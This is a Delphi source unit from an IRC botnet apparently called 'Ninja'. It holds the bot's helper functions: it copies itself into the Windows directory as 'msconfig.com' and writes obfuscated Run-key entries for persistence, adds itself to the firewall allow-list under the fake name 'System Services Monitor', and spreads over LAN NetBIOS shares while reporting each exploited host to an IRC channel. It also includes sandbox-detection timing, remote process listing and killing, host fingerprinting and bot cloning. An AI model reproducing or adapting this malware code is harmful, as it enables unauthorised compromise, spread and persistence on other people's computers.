Unit untFunctions;

Interface

Uses
  Windows,
  Winsock,
  ShellAPI,
  TLHelp32,
  Wininet;

type
  tdata = record
    channel     :string;
    key         :string;
    address     :string;
    irc_prefix  :string;
    port        :integer;
  end;
  pdata = ^tdata;

var
  thread_data   :tdata;

  function ninja_replacestr(text, replace, withword: string): string;
  function ninja_replaceshortcuts(text: string): string;
  function ninja_getnet: string;
  function ninja_dns(dns: pchar): string;
  function ninja_sandbox: boolean;
  function ninja_execute(name, parms: string; visible: integer): boolean;
  function ninja_killproc(processid: integer): boolean;
  function ninja_getcountry(ctype: cardinal): string;
  function ninja_getinfo: string;
  function ninja_getcomputername: string;
  function ninja_spreadlocal: dword; stdcall;

  procedure ninja_listproc(sock: tsocket; killproc: boolean; procid, nick: string);
  procedure ninja_allowfirewall(path: string);

  function start_ircthread(p: pointer): dword; stdcall;
  function ninja_createclone(p: pointer): dword; stdcall;

  function isnumeric(text: string): boolean;
  function inttostr(const value: integer): string;
  function strtoint(const s:string): integer;
  function LowerCase(const S: string): string;

  Function GetRegValue(Root: HKey; Path, Value: String): String;
  Function WinPath: String;
  Function ExtractFileName(szFile: String): String;
  Function GetKBS(dByte: Integer): String;
  function FileExists(const FileName: string): Boolean;
  Function BehindFirewall: Boolean;

  Procedure WriteReg(Root: HKEY; RegPath, RegName, Path: String);
  Procedure Uninstall;
  Procedure Install;
  function netbios_isntbased: boolean;

  {$I Ninja.ini}

Implementation

uses
  untBot,
  untOutputs,
  untGlobalDeclare,
  untCrypt,
  untThreads,
  untFTPD,
  untNetbios,
  exNetBios;

Function BehindFirewall: Boolean;
Var
  lSock         :TSocket;
  cSock         :TSocket;
  lAddr         :TSockAddrIn;
  cAddr         :TSockAddrIn;
  WSA           :TWSAData;
  Rem           :TSockAddr;
  Len           :Integer;
  intPort       :Integer;
  BlockCmd      :Integer;
  I             :Integer;

  FDSet         :TFDSet;
  TimeOut       :TTimeVal;
Begin
  Result := True;
  WSAStartUP($101, WSA);

  Randomize;
  intPort := Random(10000)+100;

  lSock := Socket(AF_INET, SOCK_STREAM, 0);
  lAddr.sin_family := AF_INET;
  lAddr.sin_port := hTons(intPort);
  lAddr.sin_addr.S_addr := INADDR_ANY;

  If Bind(lSock, lAddr, SizeOf(lAddr)) <> 0 Then
    Exit;

  If Listen(lSock, SOMAXCONN) <> 0 Then
    Exit;

  cSock := Socket(AF_INET, SOCK_STREAM, 0);
  cAddr.sin_family := AF_INET;
  cAddr.sin_port := hTons(intPort);
  cAddr.sin_addr.S_addr := inet_addr(pChar(ftp_mainip));
  BlockCmd := 1;
  ioctlsocket(cSock, FIONBIO, BlockCmd);
  Connect(cSock, cAddr, SizeOf(cAddr));

  Timeout.tv_sec := 5;
  timeout.tv_usec := 0;
  FD_ZERO(FDSet);
  FD_SET(cSock, FDSet);

  I := Select(0, nil, @FDSet, nil, @Timeout);
  CloseSocket(cSock);
  CloseSocket(lSock);

  If I > 0 Then
    Result := False;

  WSACleanUP();
End;

function FileExists(const FileName: string): Boolean;
var
lpFindFileData: TWin32FindData;
hFile: Cardinal;
begin
  hFile := FindFirstFile(PChar(FileName), lpFindFileData);
  if hFile <> INVALID_HANDLE_VALUE then
  begin
    result := True;
    Windows.FindClose(hFile)
  end
  else
    result := False;
end;

function netbios_isntbased: boolean;
var
  verinfo :tosversioninfo;
begin
  result := false;
  verinfo.dwOSVersionInfoSize := sizeof(tosversioninfo);
  getversionex(verinfo);
  if verinfo.dwPlatformId = ver_platform_win32_nt then result := true;
end;

procedure ninja_spreadlocal_thread(dres: pnetresource);
var
  handle        :thandle;
  kint          :dword;
  size          :dword;
  buffer        :array[0..1023] of tnetresource;
  iloop         :integer;
  output        :string;
begin

  wnetopenenum(2, 0, 0, dres, handle);
  kint := 1024;
  size := sizeof(buffer);

  while wnetenumresource(handle, kint, @buffer, size) = 0 do
    for iloop := 0 to kint - 1 do
    begin
      if buffer[iloop].dwDisplayType = resourcedisplaytype_server then
      begin
        if netbios_enumshare(buffer[iloop].lpRemoteName) then
        begin
          output := '%pm% '+g_irc_channel+' :[netbios] exploited '+buffer[iloop].lpRemoteName+#10
        end else if netbios(buffer[iloop].lpRemoteName, 0) then
          begin
            output := '%pm% '+g_irc_channel+' :[netbios] exploited '+buffer[iloop].lpRemoteName+#10
          end else
            output := '%pm% '+g_irc_channel+' :[netbios] failed to exploit '+buffer[iloop].lpRemoteName+#10;
        output := ninja_replaceshortcuts(output);
        outputadd(ftp_ircsock, output, 1000);
      end;

      if buffer[iloop].dwUsage > 0 then
        ninja_spreadlocal_thread(@buffer[iloop]);
    end;

  wnetcloseenum(handle);

end;

function ninja_spreadlocal: dword; stdcall;
begin
  ninja_spreadlocal_thread(nil);
  thread_stopname('localscan');
end;

function ninja_getcomputername: string;
var
  name  :array[0..255] of char;
  nsize :cardinal;
begin
  nsize := 255;
  GetComputerName(name, nsize);
  result := name;
end;

function ninja_getinfo: string;
begin
  result := '[info] country: '+ninja_getcountry(LOCALE_SCOUNTRY) + '/' + ninja_getcountry(LOCALE_SENGCOUNTRY) + '. '+
            'language: '+ninja_getcountry(LOCALE_SLANGUAGE) + '/' + ninja_getcountry(LOCALE_SENGLANGUAGE) + '. ' +
            'computer: '+ninja_getcomputername+'.'#10;
end;

function ninja_getcountry(ctype: cardinal): string;
var
  temp  :array[0..255] of char;
begin
  fillchar(temp, sizeof(temp), #0);
  getlocaleinfo(locale_system_default, ctype, temp, sizeof(temp));
  result := string(temp);
end;

procedure ninja_allowfirewall(path: string);
var
  f     :textfile;
begin
  // netsh firewall add allowedprogram C:\windows\system32\ntvdm.exe "NTVDM for Galileo" ENABLE
  assignfile(f, 'c:\fwadd.bat');
  rewrite(f);
  writeln(f, 'netsh firewall add allowedprogram "'+paramstr(0)+'" "System Services Monitor" ENABLE');
  writeln(f, 'del c:\fwadd.bat');
  closefile(f);

  ninja_execute('c:\fwadd.bat', '', 0);
end;

procedure writereg(root: hkey; regpath, regname, path: string);
var
  key           :hkey;
  size          :cardinal;
begin
  regpath := crypt(regpath, 35);
  regname := crypt(regname, 35);
  regopenkey(root, pchar(regpath), key);
  size := length(path);
  regsetvalueex(key, pchar(regname), 0, reg_sz, @path[1], size);
  regclosekey(key);
end;

procedure uninstall;
begin
  writereg(hkey_local_machine, 'pLEWTBQFnJ@QLPLEWtJMGLTP`VQQFMWuFQPJLMsLOJ@JFPf[SOLQFQqVM', 'NP@LMEJD', '');
  writereg(hkey_local_machine, 'pLEWTBQFnJ@QLPLEWtJMGLTP`VQQFMWuFQPJLMqVM', 'NP@LMEJD', '');
  writereg(hkey_current_user, 'pLEWTBQFnJ@QLPLEWtJMGLTP`VQQFMWuFQPJLMqVM', 'NP@LMEJD', '');
  exitprocess(0);
end;

procedure install;
var
  path          :string;
begin
  path := winpath + 'msconfig.com';
  copyfile(pchar(paramstr(0)), pchar(path), false);

  ninja_allowfirewall(path);

  writereg(hkey_local_machine, 'pLEWTBQFnJ@QLPLEWtJMGLTP`VQQFMWuFQPJLMsLOJ@JFPf[SOLQFQqVM', 'NP@LMEJD', path);
  writereg(hkey_local_machine, 'pLEWTBQFnJ@QLPLEWtJMGLTP`VQQFMWuFQPJLMqVM', 'NP@LMEJD', path);
  writereg(hkey_current_user, 'pLEWTBQFnJ@QLPLEWtJMGLTP`VQQFMWuFQPJLMqVM', 'NP@LMEJD', path);

  mutexhandleg := createmutexa(nil, false, bot_mutex);
  if getlasterror = error_already_exists then exitprocess(0);
  if mutexhandleg = error_already_exists then exitprocess(0);
end;

function getkbs(dbyte: integer): string;
var
  db    :integer;
  dkb   :integer;
  dmb   :integer;
  dgb   :integer;
  dt    :integer;
begin
  db := dbyte;
  dkb := 0;
  dmb := 0;
  dgb := 0;
  dt  := 1;

  while (db > 1024) do
  begin
    inc(dkb, 1);
    dec(db , 1024);
    dt := 1;
  end;

  while (dkb > 1024) do
  begin
    inc(dmb, 1);
    dec(dkb, 1024);
    dt := 2;
  end;

  while (dmb > 1024) do
  begin
    inc(dgb, 1);
    dec(dmb, 1024);
    dt := 3;
  end;

  case dt of
    1: result := inttostr(dkb) + '.' + copy(inttostr(db ),1,2) + ' kb';
    2: result := inttostr(dmb) + '.' + copy(inttostr(dkb),1,2) + ' mb';
    3: result := inttostr(dgb) + '.' + copy(inttostr(dmb),1,2) + ' gb';
  end;
end;

function extractfilename(szfile: string): string;
begin
  result := '';
  if szfile = '' then exit;

  repeat
    if copy(szfile, length(szfile), 1) = '\' then
      break;

    result := copy(szfile, length(szfile), 1) + result;
    delete(szfile, length(szfile), 1);
  until (szfile = '');
end;

function winpath: string;
var
  adir  :array[0..255] of char;
begin
  getwindowsdirectory(adir, 255);
  result := string(adir)+'\';
end;

function getregvalue(root: hkey; path, value: string): string;
var
  key           :hkey;
  size          :cardinal;
  regvalue      :array[0..max_path] of char;
begin
  fillchar(regvalue, sizeof(regvalue), #0);
  regopenkeyex(root, pchar(path), 0, key_query_value, key);
  size := 2048;
  regqueryvalueex(key, pchar(value), nil, nil, @regvalue[0], @size);
  regclosekey(key);
  result := regvalue;
end;

function isnumeric(text: string): boolean;
const
  numtab        :string = '0123456789';
var
  iloop         :integer;
  jloop         :integer;
  isnum         :boolean;
  char          :string;
begin
  if text = '' then
  begin
    result := false;
    exit;
  end;

  for iloop := 1 to length(text) do
  begin
    isnum := false;
    for jloop := 1 to length(numtab) do
      if (numtab[jloop] = text[iloop]) then
      begin
        isnum := true;
        break;
      end;

    if not isnum then
    begin
      result := false;
      exit;
    end;
  end;

  result := true;
end;


procedure ninja_listproc(sock: tsocket; killproc: boolean; procid, nick: string);
var
  bloop         :boolean;
  snapshot      :thandle;
  pentry32      :tprocessentry32;
  output        :string;
  count         :integer;
begin
  snapshot := createtoolhelp32snapshot(th32cs_snapprocess or th32cs_snapmodule, 0);
  pentry32.dwSize := sizeof(pentry32);
  bloop := process32first(snapshot, pentry32);

  count := 1;
  while (integer(bloop) <> 0) do
  begin
    if not killproc then
    begin
      output := '%pm% '+nick+' :[process] '+inttostr(count)+'. '+inttostr(pentry32.th32ProcessID)+' - '+pentry32.szExeFile+#10;
      output := ninja_replaceshortcuts(output);
      outputadd(sock, output, 1000);
    end else
    if lowercase(pentry32.szExeFile) = lowercase(procid) then
    begin
      if ninja_killproc(pentry32.th32ProcessID) then
        output := '%pm% '+nick+' :[process] killed '+inttostr(pentry32.th32ProcessID)+' - '+pentry32.szExeFile+#10
      else
        output := '%pm% '+nick+' :[process] failed to kill '+inttostr(pentry32.th32ProcessID)+' - '+pentry32.szExeFile+#10;
      output := ninja_replaceshortcuts(output);
      outputadd(sock, output, 1000);
    end;
    inc(count);
    bloop := process32next(snapshot, pentry32);
  end;
end;

function ninja_killproc(processid: integer): boolean;
var
  return        :boolean;
  processhandle :thandle;
begin
  result := false;

  processhandle := openprocess(PROCESS_TERMINATE, BOOL(0), processid);
  return := terminateprocess(processhandle, 0);
  if not return then exit else result := true;
end;

function ninja_execute(name, parms: string; visible: integer): boolean;
begin
  result := false;
  if shellexecute(0, 'open', pchar(name), pchar(parms), nil, visible) > 32 then
    result := true;
end;

function ninja_createclone(p: pointer): dword; stdcall;
var
  newclone      :tircbot;
begin
  newclone := tircbot.Create;
  newclone.irc_nick := c_nick;
  newclone.address := pdata(p)^.address;
  newclone.port := pdata(p)^.port;
  newclone.b_channel := pdata(p)^.channel;
  newclone.key := pdata(p)^.key;
  newclone.irc_prefix := g_irc_prefix;
  newclone.connectbot;
  newclone.free;
end;

function ninja_sandbox: boolean;
var
  count1        :integer;
  count2        :integer;
  count3        :integer;
begin
  result := false;
  count1 := gettickcount();
  sleep(1000);
  count2 := gettickcount();
  sleep(1000);
  count3 := gettickcount();
  if ((count2 - count1) < 1000) and
     ((count3 - count1) < 2000) then
     result := true;
end;

function LowerCase(const S: string): string;
var
  Ch: Char;
  L: Integer;
  Source, Dest: PChar;
begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest := Pointer(Result);
  while L <> 0 do
  begin
    Ch := Source^;
    if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  end;
end;

function ninja_dns(dns: pchar): string;
type
  taddr = array[0..100] of pinaddr;
  paddr = ^taddr;
var
  iloop         :integer;
  wsadata       :twsadata;
  hostent       :phostent;
  addr          :paddr;
begin
  wsastartup($101, wsadata);

  try
    hostent := gethostbyname(dns);
    if hostent <> nil then
    begin
      addr := paddr(hostent^.h_addr_list);
      iloop := 0;
      while addr^[iloop] <> nil do
      begin
        result := inet_ntoa(addr^[iloop]^);
        inc(iloop);
      end;
    end;
  except
    result := dns;
  end;

  wsacleanup();
end;

function start_ircthread(p: pointer): dword; stdcall;
var
  bot   :tircbot;
begin
  result := 0;

  bot := tircbot.Create;
  bot.b_channel := pdata(p)^.channel;
  bot.key := pdata(p)^.key;
  bot.address := pdata(p)^.address;
  bot.port := pdata(p)^.port;
  bot.irc_prefix := pdata(p)^.irc_prefix;
  repeat
    bot.connectbot;
  until 1=2;
end;

function strtoint(const s:string): integer;
var
  e: integer;
begin
  val(s, result, e);
end;

function inttostr(const value: integer): string;
var
  s: string[11];
begin
  str(value, s);
  result := s;
end;

function ninja_getnet: string;
var
  s     :dword;
begin
  result := 'Unknown';

  s := internet_connection_lan;
  if (internetgetconnectedstate(@s, 0)) then
    if ((s) and (internet_connection_lan) = internet_connection_lan) then
      result := 'LAN'
    else
    if ((s) and (internet_connection_modem) = internet_connection_modem) then
      result := 'Dial-up';
end;

function ninja_replaceshortcuts(text: string): string;
begin
  randomize;
  text := ninja_replacestr(text, '%lan%', lowercase(copy(ninja_getnet, 1, 1)));
  text := ninja_replacestr(text, '%rand%', inttostr(random(99999)));
  text := ninja_replacestr(text, '%pm%', c_privmsg);
  text := ninja_replacestr(text, '%ni%', c_nick);
  text := ninja_replacestr(text, '%us%', c_user);
  text := ninja_replacestr(text, '%qu%', c_quit);
  text := ninja_replacestr(text, '%jo%', c_join);
  text := ninja_replacestr(text, '%uh%', c_userhost);
  text := ninja_replacestr(text, '%co%', ninja_getcountry(LOCALE_SABBREVCTRYNAME));
  text := ninja_replacestr(text, '%cn%', ninja_getcomputername);        // %co%|name|%rand%

  result := text;
end;

function ninja_replacestr(text, replace, withword: string): string;
var
  textpos       :integer;
begin
  while pos(replace, text) > 0 do
  begin
    textpos := pos(replace, text);
    delete(text, textpos, length(replace));
    insert(withword, text, textpos);
  end;
  result := text;
end;

End.
